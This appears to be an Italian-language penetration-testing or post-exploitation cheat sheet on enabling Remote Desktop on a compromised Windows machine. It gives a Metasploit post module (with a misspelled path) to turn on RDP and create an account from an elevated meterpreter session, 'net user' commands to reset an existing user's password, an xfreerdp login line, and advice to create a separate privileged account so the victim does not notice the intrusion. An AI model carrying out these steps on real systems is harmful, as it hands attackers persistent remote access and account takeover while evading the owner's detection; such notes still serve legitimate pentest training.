
# Abilitazione di RDP
RDP (Remote Desktop Protocol) é disabilitato di default nei sistemi windows. <br>
Esiste un modulo Meteasploit per poterlo abilitare ma dobbiamo avere prima una sessione meterpreter con dei privilegi elevati. <Br>
```bash
use post/windows/menage/enable_rdp
set SESSION 1
set PASSWORD <pasword>                 # impostiamo una password per l'account che il modulo creerà
set USERNAME <username>                # impostiamo uno username per l'account che il modulo creerà
run
```

possiamo anche cambiare le credenziali di un utente se RDP é già abilitato. <br>
```bash
shell
net users          # per vedere che utenti sono presenti nel target
net user <username> <nuovaPassword>
```
per poterci autenticare con le nuove credenziali, usiamo `xfreerdp`
```bash
xfreerdp /u:<username> /p:<oassword> /v:<IP>
y

```
Questo metodono non é consigliato se non si volessero destare sospetti dato che se un utente dovesse vedere che la sua password non gli fará piú ottenere l'accesso al servizio RDP, potrebbe sospettare di essere stato soggetto ad un attacco, meglio se creiamo un altro account con permessi elevati e effettuiamo l'accesso da quello.

---
